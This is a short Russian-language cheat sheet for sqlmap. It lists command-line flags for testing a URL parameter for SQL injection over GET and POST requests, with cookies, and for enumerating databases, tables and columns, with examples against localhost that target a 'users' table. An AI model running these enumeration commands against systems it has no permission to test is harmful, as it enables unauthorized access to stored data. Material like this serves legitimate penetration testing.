## [sqlmap](http://sqlmap.org/)
### GET запросы
### Основные ключи
#### Проверяемый URL **-u**
```bash
sqlmap -u <URL>
```
> URL указывается путь вплоть до проверяемой переменной
**http://site/page?id=25**

#### Случайный агент (каким браузером представялется sqlmap) **--random-agen**
```bash
sqlmap -u <URL> --random-agent
```
### Перечень баз **--dbs**
```bash
sqlmap -u <URL> --dbs
```
### Выбор базы **-D**
```bash
sqlmap -u <URL> -D <база>
```
#### Список таблиц базы **--tables**
```bash
sqlmap -u <URL> -D <база> --tables
```
#### Выбор таблицы **-T**
```bash
sqlmap -u <URL> -D <база> -T <таблица>
```
#### Список полей таблицы **--columns**
```bash
sqlmap -u <URL> -D <база> T <таблица> --columns
```
### POST запросы
### Передача данных (полей и значений) через POST (Перечень баз **--dbs**)
```bash
sqlmap -u <URL> --dbs --data "<поле>=<значение>&<поле2>=<значение2>"
```
### Использование cookies (Перечень баз **--dbs**)
```bash
sqlmap -u <URL> --dbs --cookie "<cookie>=<значение>; <cookie2>=<значение2>"
```
### Примеры
> название полей можно посмотреть в режиме разработчика браузера или на прокси (например, ZAP proxy)

#### Вывод списка всех баз данных:
```bash
sqlmap -u http://localhost/home?id=10 --dbs --random-agent
```
#### Вывод списка полей таблицы users базы  main:
```bash
sqlmap -u http://localhost/home?id=10 -D main -T users --columns --random-agent
```
